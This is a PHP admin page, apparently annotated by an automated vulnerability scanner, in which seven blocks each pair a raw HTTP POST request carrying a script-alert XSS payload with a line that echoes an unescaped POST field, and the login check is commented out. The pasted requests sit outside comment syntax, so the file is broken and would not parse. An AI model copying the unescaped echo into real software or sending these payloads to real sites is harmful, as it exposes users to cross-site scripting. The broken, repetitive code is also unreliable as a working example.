<?php

session_start();
//Si le mec n'est pas connecté et est arrivé un peu par hasard sur cette
//page, autant le faire partir tout de suite, il n'a pas le droit
if (empty($_SESSION['mail'])){
	//header('Location: gerer.php');
}else{
	$utilisateur = $_SESSION['mail'];
}

if (isset($_POST))
{
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

v=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, 05ef58fb
    echo $_POST['v'];
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

a=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, f1533918
    echo $_POST['a'];
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

b=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, 9bd17d49
    echo $_POST['b'];
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

c=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, 32e55928
    echo $_POST['c'];
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

d=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, 27d7ee88
    echo $_POST['d'];
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

e=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, 6b0dae59
    echo $_POST['e'];
    //AI exploit:
POST /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-09a585a/admin.php HTTP/1.1
Host: localhost
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

f=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
    //TODO: AI XSS issue #66, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/66, ecc3e3b6
    echo $_POST['f'];
}


?>
